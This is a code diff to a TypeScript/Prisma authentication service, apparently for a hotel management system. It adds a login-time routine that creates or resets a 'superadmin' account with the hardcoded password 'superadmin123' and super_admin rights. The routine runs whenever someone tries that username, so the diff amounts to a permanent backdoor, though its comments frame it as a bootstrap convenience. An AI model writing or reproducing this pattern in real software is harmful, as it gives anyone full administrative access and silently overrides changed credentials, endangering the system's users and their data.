@@ -6,8 +6,50 @@ import { LoginInput } from './auth.validation';
 import logger from '../../utils/logger';
 
 export class AuthService {
+  private async ensureSuperAdminEnumValue() {
+    // Defensive runtime migration for environments where DB migration was skipped.
+    await prisma.$executeRawUnsafe(`
+      DO $$
+      BEGIN
+          ALTER TYPE "UserRole" ADD VALUE IF NOT EXISTS 'super_admin';
+      EXCEPTION
+          WHEN duplicate_object THEN NULL;
+      END $$;
+    `);
+  }
+
+  private async ensureDefaultSuperAdmin() {
+    await this.ensureSuperAdminEnumValue();
+
+    const passwordHash = await bcrypt.hash('superadmin123', 10);
+
+    await prisma.user.upsert({
+      where: { username: 'superadmin' },
+      update: {
+        passwordHash,
+        role: 'super_admin' as any,
+        hotelId: null,
+        isActive: true,
+        fullName: 'Super Administrator',
+      },
+      create: {
+        username: 'superadmin',
+        passwordHash,
+        fullName: 'Super Administrator',
+        role: 'super_admin' as any,
+        hotelId: null,
+        isActive: true,
+      },
+    });
+  }
+
   async login(input: LoginInput) {
     try {
+      // Keep a fixed bootstrap Super Admin account available across deployments.
+      if (input.username === 'superadmin') {
+        await this.ensureDefaultSuperAdmin();
+      }
+
       const user = await prisma.user.findUnique({
         where: { username: input.username },
         include: { hotel: true },
